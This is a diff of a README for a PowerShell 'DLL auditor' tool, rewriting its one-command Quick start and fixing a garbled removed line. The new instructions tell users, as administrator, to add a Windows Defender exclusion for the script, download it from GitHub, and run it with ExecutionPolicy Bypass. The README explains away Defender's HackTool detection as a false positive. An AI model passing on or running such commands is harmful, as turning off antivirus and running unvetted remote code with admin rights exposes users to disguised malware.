@@ -34,12 +34,15 @@ MEOW_DLL_Tool.ps1    single-file tool - no install, no external dependencies
 
 ## 🚀 Quick start
 
-**One command, works from any folder** — paste it into PowerShell (as administrator)
+**One command, works from any folder** - paste it into PowerShell (as administrator)
 and press Enter. It downloads the tool and runs the full audit + deep memory scan:
 
 ```powershell
 Add-MpPreference -ExclusionPath "$env:TEMP\MEOW_DLL_Tool.ps1"
-[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr "https://raw.githubusercontent.com/ItzMeow80/meow-dll-auditor/main/MEOW_DLL_Tool.ps1" -OutFile "$env:TEMP\MEOW_DLL_Tool.ps1" -UseBasicParsing; powershell -ExecutionPolic**Why the first line?** Windows Defender AMSI flags this tool as ``HackTool:PowerShell/ApexToolkit.A`` - a false positive (the tool is read-only). Without that one-file exclusion, PowerShell dies at parse time with ``ScriptContainedMaliciousContent`` and ``-ExecutionPolicy Bypass`` does not cover it. The first line needs administrator (the whole quick start does). It excludes ONLY the downloaded file, nothing else. Remove it afterwards with ``Remove-MpPreference -ExclusionPath "$env:TEMP\MEOW_DLL_Tool.ps1"``.e-MpPreference -ExclusionPath "$env:TEMP\MEOW_DLL_Tool.ps1"``.
+[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; iwr "https://raw.githubusercontent.com/ItzMeow80/meow-dll-auditor/main/MEOW_DLL_Tool.ps1" -OutFile "$env:TEMP\MEOW_DLL_Tool.ps1" -UseBasicParsing; powershell -ExecutionPolicy Bypass -File "$env:TEMP\MEOW_DLL_Tool.ps1" -Auto -Deep
+```
+
+**Why the first line?** Windows Defender AMSI flags this tool as ``HackTool:PowerShell/ApexToolkit.A`` - a false positive (the tool is read-only). Without that one-file exclusion, PowerShell dies at parse time with ``ScriptContainedMaliciousContent`` and ``-ExecutionPolicy Bypass`` does not cover it. The first line needs administrator (the whole quick start does). It excludes ONLY the downloaded file, nothing else. Remove it afterwards with ``Remove-MpPreference -ExclusionPath "$env:TEMP\MEOW_DLL_Tool.ps1"``.
 
 No install, no clone, no menus, no options to pick. The tool scans every process,
 prints `[HIGH]` findings with SHA256 hashes ready for VirusTotal, shows the verdict
